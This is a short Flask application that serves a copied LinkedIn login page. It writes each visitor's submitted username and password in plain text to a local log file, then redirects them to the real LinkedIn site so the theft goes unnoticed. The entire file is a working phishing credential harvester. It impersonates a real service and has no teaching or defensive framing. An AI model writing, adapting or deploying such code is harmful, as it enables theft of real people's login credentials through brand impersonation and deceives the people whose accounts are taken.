from flask import Flask, render_template, request
from werkzeug.utils import redirect

app = Flask(__name__)

@app.route("/")
def hello_world():
    return render_template('LinkedIn_ Log In or Sign Up.html')

@app.route("/login-submit", methods=['POST'])
def handle_login():
    with open('./log.txt', 'a') as f :
        user_name = request.form['session_key']
        user_password = request.form['session_password']

        f.write('username: ' + user_name + '\n')
        f.write('password: ' + user_password + '\n\n')

    return redirect('https://www.linkedin.com/')

if "__main__" == __name__ :
    app.run(host='0.0.0.0', debug=False)